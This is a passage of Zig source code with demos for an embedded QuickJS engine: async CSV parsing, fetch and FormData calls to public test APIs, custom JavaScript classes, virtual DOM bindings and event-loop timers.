    const js_fn = AsyncBridge.bindAsyncJson([]u8, // Payload Type (The raw CSV string)
        []Product, // Return Type (The List of Structs)
        parseCSVArg, // Argument Parser
        workerParseProducts // The Worker
    );

    try engine.registerFunction("parseProducts", js_fn, 1);

    try engine.disableUnsafeFeatures();

    // 3. JS Code
    const script =
        \\{
        \\ const csv = `101,Laptop,999.50,true
        \\              102,Mouse,25.00,true
        \\              103,Monitor,150.00,false
        \\              104,Keyboard,45.75,true`
        \\;
        \\
        \\ console.log("[JS] ⏳ Parsing CSV in background task...");
        \\
        \\ parseProducts(csv).then(jsonString => {
        \\     // The bridge returns a JSON string to keep the transport light
        \\     const products = JSON.parse(jsonString);
        \\     
        \\     console.log("[JS] ✅ Parsed " + products.length + " items:");
        \\     products.forEach(p => {
        \\         console.log(`[JS] ${p.name}: $${p.price}`);
        \\     });
        \\ });
        \\}
    ;

    const res = try engine.eval(script, "test.js", .global);
    engine.ctx.freeValue(res);
    try engine.run();
}
// ----------------------------------------------------------------

fn workerParseTupleProducts(allocator: std.mem.Allocator, csv_text: []u8) ![]parseCSV.ProductRow {
    // defer allocator.free(csv_text); // Clean up payload
    z.print("[Worker] Tuple Parsing.....\n", .{});
    return parseCSV.parseCSVToTuples(allocator, csv_text);
}

fn async_CSV_Tuple_Parser(allocator: std.mem.Allocator, sbx: []const u8) !void {
    const engine = try ScriptEngine.init(allocator, sbx);
    defer engine.deinit();

    z.print("\n=== Zig Native CSV_as_Tuple parser worker called from JS --------------\n\n", .{});

    // 1. Create the binding
    // bindAsyncJson takes care of serializing []Product -> JSON String
    const js_fn = AsyncBridge.bindAsyncJson([]u8, // Payload Type (The raw CSV string)
        []parseCSV.ProductRow, // Return Type (The List of Structs)
        parseCSVArg, // Argument Parser
        workerParseTupleProducts // The Worker
    );

    // 2. Register it
    try engine.registerFunction("parseProducts", js_fn, 1);

    const script =
        \\const csv_data = `101,Laptop,999.50
        \\                  102,Mouse,25.00
        \\                  103,Monitor,150.00
        \\                  104,Keyboard,45.75`
        \\;
        \\console.log("[JS] ⏳ Parsing CSV in background task...");
        \\
        \\parseProducts(csv_data).then(jsonStr => {
        \\   // 1. Parse the lightweight JSON
        \\   const rows = JSON.parse(jsonStr); 
        \\   console.log(`[JS] ✅ Loaded ${rows.length} rows`);
        \\   // 2. Iterate with Destructuring (Restores "Column Names" visually)
        \\   rows.forEach(([id, name, price]) => {
        \\     // Now you can use variables 'id', 'name', 'price' naturally
        \\     console.log(`[JS] Item #${id}: ${name} costs $${price}`);
        \\   })
        \\});
    ;

    // Or map it to objects if you really need to pass it to a UI library
    // const uiData = rows.map(([id, name, price]) => ({ id, name, price }));
    const res = try engine.eval(script, "test2.js", .global);
    engine.ctx.freeValue(res);
    try engine.run();
}

// Fetch API -------------------------------------------------------------

fn async_Fetch_Blob(allocator: std.mem.Allocator, sbx: []const u8) !void {
    z.print("\n=== Async Fetch BLOB  ----------------------------------------\n\n", .{});
    var engine = try ScriptEngine.init(allocator, sbx);
    defer engine.deinit();

    const script =
        \\fetch('https://dummyjson.com/image/150')
        \\.then((response) => response.blob()) 
        \\.then(async (blob) => {
        \\  const blob_txt = await blob.text();
        \\  const size = blob.size;
        \\  console.log('Fetched image blob:', size, blob_txt);
        \\})
        \\.catch(error => {
        \\  console.log('🔴 Fetch error:', error);
        \\});
    ;
    const res = try engine.eval(script, "<fetch>", .module);
    engine.ctx.freeValue(res);
    try engine.run();
}

fn async_Fetch_API_Demo(allocator: std.mem.Allocator, sbx: []const u8) !void {
    const engine = try ScriptEngine.init(allocator, sbx);
    defer engine.deinit();

    z.print("\n=== Async Fetch API Demo ----------------------------------------\n\n", .{});

    const script =
        \\console.log("🔵 Starting Fetch API demo...");
        \\fetch("https://jsonplaceholder.typicode.com/todos/1")
        \\  .then(async (response) => {
        \\    if (!response.ok) {
        \\      console.error("🔴 Fetch error:", err);
        \\      throw new Error("Network response was not ok");
        \\    }
        \\    console.log("🟢 Response received, status:", response.status);
        \\    const txt = await response.text();
        \\    console.log("🔵 Body text:", txt);
        \\    return txt; 
        \\})
        \\  .then((text) => {
        \\    const data = JSON.parse(text);
        \\    console.log("🔵 JSON Data:", JSON.stringify(data, null, 2));
        \\  })
        \\  .catch(err => {
        \\    console.error("🔴 Fetch error:", err);
        \\  });
        \\
        \\fetch("https://jsonplaceholder.typicode.com/posts", {
        \\  method: 'POST',
        \\  body: JSON.stringify({
        \\    title: 'foo',
        \\    body: 'bar',
        \\    userId: 1,
        \\  }),
        \\  headers: {
        \\    'Content-type': 'application/json; charset=UTF-8',
        \\  },
        \\})
        \\  .then((response) => response.json())
        \\  .then((json) => console.log("🟢 Response JSON:", JSON.stringify(json)))
        \\  .catch(err => {
        \\    console.error("🔴 Fetch error:", err);
        \\  });
    ;

    const res = try engine.eval(script, "<fetch>", .global);
    engine.ctx.freeValue(res);
    try engine.run();
}

fn uploadFile(allocator: std.mem.Allocator, sbx: []const u8) !void {
    z.print("\n=== Upload file with FormData ----------------------------------------\n\n", .{});
    var engine = try ScriptEngine.init(allocator, sbx);
    defer engine.deinit();

    const script =
        \\const formData = new FormData();
        \\
        \\// Create a filetext blob and append it (simulating a file)
        \\const blob = new Blob(["Hello form data!"], { type: "text/plain" });
        \\formData.append("file", blob, "hello.txt");
        \\
        \\console.log("Sending POST...");
        \\
        \\fetch('https://httpbin.org/post', {
        \\    method: 'POST',
        \\    body: formData
        \\})
        \\.then(res => res.json())
        \\.then(data => {
        \\    // httpbin returns the data it received
        \\    console.log("🟢 Server received:", data);
        \\})
        \\.catch(err => console.log("🔴 Error:", err));
    ;
    const res = try engine.eval(script, "<fetch>", .module);
    engine.ctx.freeValue(res);
    try engine.run();
}

// Install Custom Class -------------------------------------------------
pub fn customPointClass(allocator: std.mem.Allocator) !void {
    z.print("\n=== Custom Class Demo (Point) -------------------\n", .{});

    const engine = try ScriptEngine.init(allocator);
    defer engine.deinit();

    try Pt.install(engine.rt, engine.ctx);

    // ========================================================================
    // TEST IN JAVASCRIPT
    // ========================================================================

    const code =
        \\console.log("1. Creating Point(3, 4)...");
        \\const pt = new Point(3, 4);
        \\
        \\console.log("2. Calculating distance...");
        \\const d = pt.distance();
        \\console.log(`   Distance is: ${d}`);
        \\
        \\console.log("3. Testing Getter/Setter...");
        \\console.log(`   Original X: ${pt.x}`);
        \\pt.x = 5;
        \\console.log(`   New X: ${pt.x}`);
        \\console.log(`   Original Y: ${pt.y}`);
        \\pt.y = 12;
        \\console.log(`   New Y: ${pt.y}`);
        \\console.log(`   New Distance: ${pt.distance()}`);
        \\console.log(`.  Point(${pt.x}, ${pt.y})`);
        \\
        \\console.log("4. Cleanup...");
        \\
    ;

    const res = try engine.eval(code, "<demo>");

    if (engine.ctx.isException(res)) {
        _ = engine.ctx.checkAndPrintException();
    }
    engine.ctx.freeValue(res);

    // Force GC to show finalizer running
    // engine.rt.runGC();
}

// Install Custom Class with ClassBuilder (Auto-generated) -----------------
pub fn demoPoint2Class(allocator: std.mem.Allocator) !void {
    z.print("\n=== ClassBuilder Demo (Point2 - Auto-generated!) -------------------\n", .{});

    const engine = try ScriptEngine.init(allocator);
    defer engine.deinit();

    try Pt2.register(engine.ctx);

    // ========================================================================
    // TEST IN JAVASCRIPT
    // ========================================================================

    const code =
        \\console.log("1. Creating Point({ x: 3, y: 4 })...");
        \\const pt = new Point({ x: 3, y: 4 });
        \\
        \\console.log("2. Calculating distance...");
        \\const d = pt.distance();
        \\console.log(`   Distance is: ${d}`);
        \\
        \\console.log("3. Testing Auto-generated Getters/Setters...");
        \\console.log(`   Original X: ${pt.x}`);
        \\pt.x = 5;
        \\console.log(`   New X: ${pt.x}`);
        \\console.log(`   Original Y: ${pt.y}`);
        \\pt.y = 12;
        \\console.log(`   New Y: ${pt.y}`);
        \\console.log(`   New Distance: ${pt.distance()}`);
        \\
        \\console.log("4. Testing Auto-generated toString()...");
        \\console.log(`   ${pt.toString()}`);
        \\
        \\console.log("5. Cleanup...");
        \\
    ;

    const res = try engine.eval(code, "<demo>");

    if (engine.ctx.isException(res)) {
        _ = engine.ctx.checkAndPrintException();
    }
    engine.ctx.freeValue(res);

    // z.print("=== Demo Complete ===\n", .{});
}
// Virtual DOM Bridge Tests --------------------------------------------------

/// Test the auto-generated QuickJS bindings
fn demoVirtualDOM_1(allocator: std.mem.Allocator, rt: *zqjs.Runtime) !void {
    z.print("\n=== Testing Auto-Generated Bindings --------------\n\n", .{});

    const ctx = zqjs.Context.init(rt);
    errdefer ctx.deinit();
    // set allocator for QuickJS context as the context has no access to DOMBridge allocator
    ctx.setAllocator(&allocator);

    var dom_bridge = try DOMBridge.init(allocator, ctx);

    // Install Bindings (static + prototype) and APIs (document, window, console)
    // var bridge = try DOMBridge.init(allocator, ctx);
    defer ctx.deinit(); // Cleanup order: ctx must be destroyed AFTER bridge
    defer dom_bridge.deinit();
    // defer bridge.deinit(); // (defer is LIFO, so this runs first)

    try dom_bridge.installAPIs();

    // Test the bindings via JavaScript
    // Static bindings are on 'document' object
    // Method bindings are on element prototypes
    const test_code =
        \\console.log("\n1. Testing createElement (static binding on document)...");
        \\const elem = document.createElement("div");
        \\console.log("✓ createElement returned:", typeof elem);
        \\
        \\console.log("\n2. Testing setAttribute (method binding via prototype)...");
        \\elem.setAttribute("id", "test-element");
        \\elem.setAttribute("class", "test-class");
        \\console.log("✓ setAttribute succeeded");
        \\
        \\console.log("\n3. Testing getAttribute (method binding via prototype)...");
        \\const id = elem.getAttribute("id");
        \\console.log("✓ getAttribute returned:", id);
        \\
        \\console.log("\n4. Testing createTextNode (static binding on document)...");
        \\const textNode = document.createTextNode("Hello, World!");
        \\console.log("✓ createTextNode returned:", typeof textNode);
        \\console.log("\n4.b Testing getting Text node content");
        \\console.log("✓ node.textContent() returns :", textNode.textContent());
        \\
        \\console.log("\n5. Testing appendChild (method binding via prototype)...");
        \\elem.appendChild(textNode);
        \\console.log("✓ appendChild succeeded");
        \\
        \\console.log("\n5.b Adding element to document body...");
        \\const body = document.bodyElement();
        \\body.appendChild(elem);
        \\console.log("✓ Element added to document tree");
        \\
        \\console.log("\n6. Testing firstChild (DOM navigation)...");
        \\const child = elem.firstChild();
        \\console.log("✓ firstChild returned:", child === textNode ? "correct text node" : typeof child);
        \\
        \\// TODO: check why this fails: console.log("owner: ",child.ownerDocument());
        \\
        \\console.log("\n7. Testing parentNode (DOM navigation)...");
        \\const parent = textNode.parentNode();
        \\console.log("✓ parentNode returned:", parent === elem ? "correct parent element" : typeof parent);
        \\
        \\console.log("\n8. Testing textContent (zero-copy getter)...");
        \\const text = elem.textContent;
        \\console.log("✓ textContent returned:", text);
        \\
        \\console.log("\n9. Checking document body HTML...");
        \\console.log("✓ Body innerHTML:", body.innerHTML());
        \\
        \\console.log("\n✓ All generated bindings work correctly!");
        \\console.log("✓ DOM tree navigation working: elem -> textNode -> elem");
        \\console.log("✓ Zero-copy textContent working!");
        \\console.log("✓ Document tree properly built!");
    ;

    const result = try ctx.eval(
        test_code,
        "<generated-bindings-test>",
        .{},
    );
    defer ctx.freeValue(result);

    if (z.isException(result)) {
        const exception = ctx.getException();
        defer ctx.freeValue(exception);

        const error_str = try ctx.toZString(exception);
        defer ctx.freeZString(error_str);
        z.print("Error executing generated bindings test: {s}\n", .{error_str});
        return error.RuntimeError;
    }

    z.print("\n=== Document HTML (from Zig side) ===\n", .{});
    const root = z.bodyNode(dom_bridge.doc).?;
    try z.prettyPrint(allocator, root);

    z.print("\n", .{});

    // Run garbage collection to free bytecode and temporary objects
    rt.runGC();
}

fn demoVirtualDOM_2(allocator: std.mem.Allocator, rt: *zqjs.Runtime) !void {
    z.print("\n=== Virtual DOM Bridge - SSR Demo (DIAGNOSTIC MODE) ===\n\n", .{});

    const ctx = zqjs.Context.init(rt);
    errdefer ctx.deinit();
    ctx.setAllocator(&allocator);

    var bridge = try DOMBridge.init(allocator, ctx);
    defer ctx.deinit(); // Cleanup order: ctx must be destroyed AFTER bridge
    defer bridge.deinit(); // (defer is LIFO, so this runs first)

    try bridge.installAPIs();

    z.print("--- Testing appendChild to body ---\n", .{});
    const html =
        \\const container = document.createElement("div");
        \\container.setAttribute("id", "app-container");
        \\container.setAttribute("class", "main-wrapper");
        \\
        \\const heading = document.createElement("h1");
        \\heading.setContentAsText("Virtual DOM Test");
        \\container.appendChild(heading);
        \\
        \\const paragraph = document.createElement("p");
        \\paragraph.setAttribute("class", "description");
        \\paragraph.setContentAsText("This was created via JavaScript!");
        \\container.appendChild(paragraph);
        \\
        \\const list = document.createElement("ul");
        \\for (let i = 1; i<4; i++) {
        \\  const item = document.createElement("li");
        \\  item.setAttribute("id", i);
        \\  item.setContentAsText("Item " + i * 10);
        \\  list.appendChild(item);
        \\}
        \\container.appendChild(list);
        \\
        \\const body = document.bodyElement();
        \\body.appendChild(container);
        \\console.log('Step 4: DOM structure created and appended to body');
    ;
    const result = try ctx.eval(
        html,
        "<ssr>",
        .{},
    );
    defer ctx.freeValue(result);

    if (z.isException(result)) {
        const exception = ctx.getException();
        defer ctx.freeValue(exception);

        const error_str = try ctx.toZString(exception);
        defer ctx.freeZString(error_str);
        z.print("Error executing generated bindings test: {s}\n", .{error_str});
        return error.RuntimeError;
    }

    const root = z.bodyNode(bridge.doc).?;
    try z.prettyPrint(allocator, root);

    // VERIFY: Check if Lexbor document actually contains what we created
    z.print("--- Verification: Inspecting Lexbor Document ---\n", .{});

    z.print("\n📋 Document Body HTML:\n", .{});
    const body_html = try z.innerHTML(allocator, z.nodeToElement(root).?);
    defer allocator.free(body_html);
    z.print("{s}\n\n", .{body_html});

    // Pretty print the DOM tree
    z.print("📊 Document Body Tree:\n", .{});
    try z.prettyPrint(allocator, root);
    z.print("\n", .{});

    // Verify specific elements exist
    z.print("🔍 Verification Checks:\n", .{});

    // Check for container with id="app-container"
    const container_selector = "#app-container";
    if (try z.querySelector(allocator, bridge.doc, container_selector)) |container_elem| {
        z.print("  ✅ Found container div with id='app-container'\n", .{});

        // Check attributes
        if (try z.getAttribute(allocator, container_elem, "class")) |class_val| {
            defer allocator.free(class_val);
            z.print("  ✅ Container has class='{s}'\n", .{class_val});
        }
    } else {
        z.print("  ❌ Container div not found!\n", .{});
    }

    // Check for h1
    const h1_selector = "h1";
    if (try z.querySelector(allocator, bridge.doc, h1_selector)) |h1_elem| {
        const text = z.textContent_zc(z.elementToNode(h1_elem));
        z.print("  ✅ Found h1 with text: '{s}'\n", .{text});
    } else {
        z.print("  ❌ h1 not found!\n", .{});
    }

    // Check for paragraph with class
    const p_selector = "p.description";
    if (try z.querySelector(allocator, bridge.doc, p_selector)) |p_elem| {
        const text = z.textContent_zc(z.elementToNode(p_elem));
        z.print("  ✅ Found paragraph with text: '{s}'\n", .{text});
    } else {
        z.print("  ❌ Paragraph not found!\n", .{});
    }

    // Check for list items
    const li_selector = "li";
    const li_elements = try z.querySelectorAll(allocator, bridge.doc, li_selector);
    defer allocator.free(li_elements);
    z.print("  ✅ Found {d} list items\n", .{li_elements.len});

    if (li_elements.len == 3) {
        z.print("  ✅ Correct number of list items!\n", .{});
    } else {
        z.print("  ❌ Expected 3 list items, found {d}\n", .{li_elements.len});
    }

    // z.print("\n✅ VERIFICATION COMPLETE: JavaScript DOM operations successfully modified Lexbor document!\n", .{});

    // Run garbage collection to free bytecode and temporary objects
    rt.runGC();
}

// ---------------------------------------------------------------------------
/// Demo: Native Bridge - Passing data between QuickJS and Zig
fn demoNativeBridge(gpa: std.mem.Allocator, rt: *zqjs.Runtime) !void {
    z.print("\n=== Native Bridge Demo: JS ↔ Zig Data Transfer ------\n\n", .{});

    const ctx = zqjs.Context.init(rt);
    errdefer ctx.deinit();
    ctx.setAllocator(&gpa);

    // NativeBridge.installNativeBridge(ctx, &gpa);
    // Test 1: Process regular array
    z.print("--- Test 1: Process Array (JS → Zig → JS) ---\n", .{});
    const test1 =
        \\const data = [1, 2, 3, 4, 5];
        \\console.log("Input array:", data);
        \\const result = Native.processArray(data);
        \\console.log("Result from Zig:", result);
        \\result;
    ;
    const result1 = try ctx.eval(test1, "<test1>", .{});
    defer ctx.freeValue(result1);

    // Test 2: Transform array (return new array)
    z.print("\n--- Test 2: Transform Array (Return New Array) ---\n", .{});
    const test2 =
        \\const input = [1, 2, 3, 4, 5];
        \\console.log("Input:", input);
        \\const output = Native.transformArray(input);
        \\console.log("Result from Zig:", output);
        \\output;
    ;
    const result2 = try ctx.eval(test2, "<test2>", .{});
    defer ctx.freeValue(result2);

    // Test 3: TypedArray (zero-copy performance)
    z.print("\n--- Test 3: TypedArray (Zero-Copy) ---\n", .{});
    const test3 =
        \\const buffer = new Float64Array([10, 20, 30, 40, 50]);
        \\console.log("TypedArray input:", buffer);
        \\const result = Native.processTypedArray(buffer);
        \\console.log("Result from Zig (zero-copy!):", result);
        \\result;
    ;
    const result3 = try ctx.eval(test3, "<test3>", .{});
    defer ctx.freeValue(result3);

    // Test 4: Process object
    z.print("\n--- Test 4: Process Object ---\n", .{});
    const test4 =
        \\const obj = { x: 10, y: 20, values: [1, 2, 3, 4, 5] };
        \\console.log("Input object:", JSON.stringify(obj));
        \\const result = Native.processObject(obj);
        \\console.log("Result from Zig:", result);
        \\result;
    ;
    const result4 = try ctx.eval(test4, "<test4>", .{});
    defer ctx.freeValue(result4);

    // Test 5: Process text
    z.print("\n--- Test 5: Text Processing ---\n", .{});
    const test5 =
        \\const messy = "Hello   World  !  How   are   you?";
        \\console.log("Input text:", messy);
        \\const clean = Native.processText(messy);
        \\console.log("Cleaned by Zig:", clean);
        \\clean;
    ;
    const result5 = try ctx.eval(test5, "<test5>", .{});
    defer ctx.freeValue(result5);

    z.print("\n✅ Native bridge working!\n", .{});
    z.print("  • JavaScript can call Zig functions\n", .{});
    z.print("  • Data flows: JS → Zig → JS\n", .{});
    z.print("  • Heavy computation runs at native speed\n\n", .{});
}

// ---------------------------------------------------------------------------

// Proxy & Generators --------------------------------------------------------
fn JS_Proxy_And_Generators(allocator: std.mem.Allocator) !void {
    z.print("\n=== Proxy & Generators ------------------------------\n\n", .{});
    const engine = try ScriptEngine.init(allocator);
    defer engine.deinit();

    // Proxy - intercept property access--------------
    const proxy_test =
        \\// Create a reactive object using Proxy
        \\const handler = {
        \\  get: function(target, prop) {
        \\    console.log(`[JS] Getting property: ${prop}`);
        \\    return target[prop];
        \\  },
        \\  set: function(target, prop, value) {
        \\    console.log(`[JS] Setting ${prop} = ${value}`);
        \\    target[prop] = value;
        \\    return true;
        \\  }
        \\};
        \\
        \\const obj = { name: "Zig", version: "0.15.2" };
        \\const proxy = new Proxy(obj, handler);
        \\
        \\// Test getter
        \\const n = proxy.name;
        \\
        \\// Test setter
        \\proxy.version = "0.16.0";
        \\
    ;

    z.print("--- Test 1: ES6 Proxy ---\n", .{});

    const val1 = try engine.ctx.eval(proxy_test, "<proxy>", .{});
    defer engine.ctx.freeValue(val1);

    const result1_str = try engine.ctx.toZString(val1);
    defer engine.ctx.freeZString(result1_str);

    z.print("Result: {s}\n\n", .{result1_str});

    // Test: Generator functions
    const generator_test =
        \\function* numberGenerator() {
        \\  yield 1;
        \\  yield 2;
        \\  yield 3;
        \\}
        \\
        \\const gen = numberGenerator();
        \\const values = [];
        \\
        \\let next = gen.next();
        \\while (!next.done) {
        \\  values.push(next.value);
        \\  next = gen.next();
        \\}
        \\
        \\JSON.stringify(values);
    ;

    z.print("--- Generator Functions ---\n", .{});
    const val2 = try engine.ctx.eval(generator_test, "<generator>", .{});
    defer engine.ctx.freeValue(val2);

    const res2_str = try engine.ctx.toZString(val2);
    defer engine.ctx.freeZString(res2_str);

    z.print("Generator output: {s}\n\n", .{res2_str});
}

// ============================================================================
// Wrapper functions: Local vs Global EventLoop patterns
// ============================================================================

/// Local pattern: Each context creates its own EventLoop
fn runWithLocalEventLoops(gpa: std.mem.Allocator, rt: *zqjs.Runtime) !void {
    z.print("\n========================================\n", .{});
    z.print("RUNNING WITH LOCAL EVENT LOOPS\n", .{});
    z.print("========================================\n", .{});

    const ctx = zqjs.Context.init(rt);
    defer ctx.deinit();

    var event_loop = try EventLoop.create(gpa, rt);
    defer event_loop.destroy();
    try event_loop.install(ctx);

    // Start event loop in background thread
    const EventLoopThread = struct {
        fn run(loop: *EventLoop) void {
            loop.run(.Server) catch |err| {
                z.print("Event loop error: {}\n", .{err});
            };
        }
    };

    const thread = try std.Thread.spawn(
        .{},
        EventLoopThread.run,
        .{&event_loop},
    );
    defer {
        event_loop.should_exit = true;
        thread.join();
    }

    // try demoEventLoop(allocator, rt);
    try demoZigToAsyncJS(gpa, rt);
    const css_content = try zexplore_example_com(gpa, "https://www.example.com");
    defer gpa.free(css_content);
}

/// Global pattern: One EventLoop per Runtime, shared across contexts
fn runWithGlobalEventLoop(allocator: std.mem.Allocator, rt: *zqjs.Runtime) !void {
    z.print("\n========================================\n", .{});
    z.print("RUNNING WITH GLOBAL EVENT LOOP\n", .{});
    z.print("========================================\n", .{});

    // Create ONE event loop for the entire runtime (context-agnostic)
    var event_loop = try EventLoop.create(allocator, rt);
    defer event_loop.destroy();
    event_loop.linkSignalFlag(&app_should_quit);

    try demoEventLoopGlobal(allocator, rt, event_loop);
    // try demoVirtualDOM_2(allocator, rt);
    try demoAsyncTaskInfrastructureGlobal(allocator, rt, event_loop);
}

/// Demo: Event Loop with borrowed global instance
fn demoEventLoopGlobal(allocator: std.mem.Allocator, rt: *zqjs.Runtime, event_loop: *EventLoop) !void {
    _ = allocator;
    z.print("\n=== Event Loop Demo (Global): setTimeout & setInterval ------\n\n", .{});
    const ctx = zqjs.Context.init(rt);
    defer ctx.deinit();

    // Install timer APIs for this context
    try event_loop.install(ctx);

    // Test 1: Simple setTimeout
    z.print("--- Test 1: setTimeout (500ms) ---\n", .{});
    const timeout_test =
        \\globalThis.count = 0;
        \\setTimeout(() => {
        \\  globalThis.count = 42;
        \\  console.log("setTimeout fired! count = " + globalThis.count);
        \\}, 500);
        \\globalThis.count; // Should be 0 initially
    ;

    const result1 = try ctx.eval(timeout_test, "<timeout_test>", .{});
    defer ctx.freeValue(result1);

    var initial_count: i32 = 0;
    _ = z.qjs.JS_ToInt32(ctx.ptr, &initial_count, result1);
    z.print("Initial count (before timeout): {d}\n", .{initial_count});

    // Test 2: setInterval with clearInterval
    z.print("\n--- Test 2: setInterval (200ms, cancel after 5 iterations) ---\n", .{});
    const interval_test =
        \\let counter = 0;
        \\const intervalId = setInterval(() => {
        \\  counter++;
        \\  console.log("Interval tick: " + counter);
        \\  if (counter >= 5) {
        \\    clearInterval(intervalId);
        \\    console.log("Interval cleared!");
        \\  }
        \\}, 200);
        \\intervalId;
    ;

    const result2 = try ctx.eval(interval_test, "<interval_test>", .{});
    defer ctx.freeValue(result2);

    // Test 3: Multiple timers with different delays
    z.print("\n--- Test 3: Multiple timers (100ms, 300ms, 700ms) ---\n", .{});
    const multiple_timers =
        \\setTimeout(() => console.log("Timer 1: 100ms"), 100);
        \\setTimeout(() => console.log("Timer 2: 300ms"), 300);
        \\setTimeout(() => console.log("Timer 3: 700ms"), 700);
        \\"Timers scheduled";
    ;

    const result3 = try ctx.eval(multiple_timers, "<multiple>", .{});
    defer ctx.freeValue(result3);

    const scheduled_msg = z.qjs.JS_ToCString(ctx.ptr, result3);
    if (scheduled_msg != null) {
        defer z.qjs.JS_FreeCString(ctx.ptr, scheduled_msg);
        z.print("{s}\n", .{scheduled_msg});
    }

    // Test 4: Async/await with setTimeout
    z.print("\n--- Test 4: Async/await + setTimeout ---\n", .{});
    const async_test =
        \\async function delayedGreeting(name, ms) {
        \\  return new Promise(resolve => {
        \\    setTimeout(() => resolve("Hello, " + name + "!"), ms);
        \\  });
        \\}
        \\
        \\(async () => {
        \\  console.log("Starting async operation...");
        \\  const msg = await delayedGreeting("Zig", 400);
        \\  console.log("Async result: " + msg);
        \\})();
        \\"Async operation started";
    ;

    const result4 = try ctx.eval(async_test, "<async>", .{});
    defer ctx.freeValue(result4);

    // Run the event loop to process all timers
    z.print("\n🔄 Running event loop...\n\n", .{});
    try event_loop.run(.Script);

    z.print("\n✅ Event loop completed!\n", .{});
    z.print("  • setTimeout works\n", .{});
    z.print("  • setInterval works\n", .{});
    z.print("  • clearTimeout/clearInterval work\n", .{});
    z.print("  • Async/await + setTimeout integration works\n\n", .{});

    // Verify final count value
    const global = ctx.getGlobalObject();
    defer ctx.freeValue(global);

    const count_prop = ctx.getPropertyStr(global, "count");
    defer ctx.freeValue(count_prop);

    var final_count: i32 = 0;
    _ = z.qjs.JS_ToInt32(ctx.ptr, &final_count, count_prop);
    z.print("Final count (after setTimeout): {d}\n\n", .{final_count});
}

/// Demo: Async Task Infrastructure with borrowed global instance
fn demoAsyncTaskInfrastructureGlobal(allocator: std.mem.Allocator, rt: *zqjs.Runtime, event_loop: *EventLoop) !void {
    z.print("\n=== Async Task Infrastructure Test (Global) ===\n\n", .{});
    const ctx = zqjs.Context.init(rt);
    defer ctx.deinit();

    // Install timer APIs for this context
    try event_loop.install(ctx);

    z.print("--- Test: Manual async task enqueue ---\n", .{});

    const promise_test =
        \\let testPassed = false;
        \\const promise = new Promise((resolve, reject) => {
        \\  globalThis._testResolve = resolve;
        \\  globalThis._testReject = reject;
        \\});
        \\promise.then(data => {
        \\  console.log("Promise resolved with:", data);
        \\  testPassed = true;
        \\}).catch(err => {
        \\  console.log("Promise rejected with:", err);
        \\});
        \\"Promise created, waiting for async task...";
    ;

    const result1 = try ctx.eval(promise_test, "<promise_test>", .{});
    defer ctx.freeValue(result1);

    const global = ctx.getGlobalObject();
    defer ctx.freeValue(global);
    const resolve_fn = ctx.getPropertyStr(global, "_testResolve");
    defer ctx.freeValue(resolve_fn);

    const test_data = try allocator.dupe(u8, "Hello from async task!");
    const async_task = AsyncTask{
        .ctx = ctx,
        .resolve = ctx.dupValue(resolve_fn),
        .reject = zqjs.UNDEFINED,
        .result = .{ .success = test_data },
    };

    z.print("Enqueueing async task...\n", .{});
    event_loop.enqueueTask(async_task);

    const exit_timer =
        \\setTimeout(() => {
        \\  console.log("Test completed!");
        \\}, 100);
    ;

    const result2 = try ctx.eval(exit_timer, "<exit>", .{});
    defer ctx.freeValue(result2);

    z.print("Running event loop...\n", .{});
    try event_loop.run(.Script);

    z.print("\n✓ Async task infrastructure test completed\n", .{});
    z.print("  - AsyncTask struct works correctly\n", .{});
    z.print("  - enqueueTask() thread-safe enqueue works\n", .{});
    z.print("  - processAsyncTasks() resolves promises\n", .{});
    z.print("  - Event loop integrates async tasks with timers\n", .{});
}

fn parseSimulate(ctx: zqjs.Context, args: []const zqjs.Value) !u64 {
    if (args.len < 1) {
        _ = ctx.throwTypeError("simulateWork requires 1 argument (ms)");
        return error.InvalidArgs;
    }
    // Return the delay as u64 (the Payload)
    return try ctx.toInt64(args[0]);
}

// on ThreadPool
fn doSimulate(allocator: std.mem.Allocator, delay_ms: u64) ![]u8 {
    // Blocking work
    std.time.sleep(delay_ms * 1_000_000);

    // Return result (must be allocated with 'allocator')
    return std.fmt.allocPrint(allocator, "✅ Waited {d}ms via Generic Bridge!", .{delay_ms});
}

fn demoParallelExecution(allocator: std.mem.Allocator, rt: *zqjs.Runtime) !void {
    z.print("\n=== Parallel Execution Demo ===\n\n", .{});

    const ctx = zqjs.Context.init(rt);
    defer ctx.deinit();
    ctx.setAllocator(&allocator);

    const event_loop = try EventLoop.create(allocator, rt);
    defer event_loop.destroy();
    event_loop.linkSignalFlag(&app_should_quit);

    try event_loop.install(ctx);

    const code =
        \\async function runDemo() {
        \\  let start = Date.now();
        \\  
        \\  // 1. SEQUENTIAL
        \\  console.log("🐌 Starting SEQUENTIAL tasks (await one by one)...");
        \\  await simulateWork(1000);
        \\  console.log("   - Task 1 done after :", Date.now()-start);
        \\  await simulateWork(1000);
        \\  console.log("   - Task 2 done after :", Date.now()-start);
        \\  const seqTime = Date.now() - start;
        \\  console.log(`🐌 Sequential Total: ${seqTime}ms (Expected ~2000ms)\n`);
        \\
        \\  // 2. PARALLEL
        \\  start = Date.now();
        \\  console.log("🚀 Starting PARALLEL tasks (Promise.all)...");
        \\  
        \\  // Launch both immediately!
        \\  const p1 = simulateWork(1000);
        \\  const p2 = simulateWork(1000);
        \\  const p3 = simulateWork(1000);
        \\
        \\  // Wait for all to finish
        \\  await Promise.all([p1, p2, p3]);
        \\  
        \\  const parTime = Date.now() - start;
        \\  console.log(`🚀 Parallel Total: ${parTime}ms (Expected ~1000ms)`);
        \\}
        \\
        \\runDemo();
    ;

    const res = try ctx.eval(code, "<parallel_demo>", .{});
    defer ctx.freeValue(res);

    try event_loop.run(.Script);
}

// Demo: Async Task Infrastructure
fn demoZigToAsyncJS(allocator: std.mem.Allocator, rt: *zqjs.Runtime) !void {
    z.print("\n[Zig] Passing data between Zig and Async Task\n\n", .{});

    // Initialize event loop
    var event_loop = try EventLoop.create(allocator, rt);
    defer event_loop.destroy();

    const ctx = zqjs.Context.init(rt);
    defer ctx.deinit();

    try event_loop.install(ctx);

    // Test: Manually enqueue an async task (simulating worker thread completion)

    const promise_test =
        \\globalThis.testPassed = false;
        \\globalThis.receivedData = null;
        \\
        \\const promise = new Promise((resolve, reject) => {
        \\  globalThis._testResolve = resolve;
        \\  globalThis._testReject = reject;
        \\});
        \\
        \\promise.then(data => {
        \\  console.log("Promise resolved with data passed from Zig: ", data);
        \\  globalThis.receivedData = data;
        \\  globalThis.testPassed = true;
        \\}).catch(err => {
        \\  console.log("Promise rejected with:", err);
        \\}).then(() => {
        \\  setTimeout(() => console.log("✅Test completed!"), 100);
        \\});
    ;

    const result1 = try ctx.eval(
        promise_test,
        "<promise_test>",
        .{},
    );
    defer ctx.freeValue(result1);

    // Get the resolve function
    const global = ctx.getGlobalObject();
